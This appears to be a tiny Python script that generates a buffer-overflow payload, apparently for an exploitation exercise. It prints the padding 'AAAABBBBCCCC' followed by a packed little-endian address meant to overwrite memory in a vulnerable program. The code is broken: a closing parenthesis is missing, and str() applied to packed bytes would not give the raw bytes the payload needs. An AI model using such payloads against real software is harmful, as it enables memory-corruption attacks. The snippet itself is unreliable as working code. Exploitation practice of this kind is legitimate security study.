from struct import pack
p = 'AAAABBBBCCCC'
p += str(pack('<I', 0x0802840)
print(p)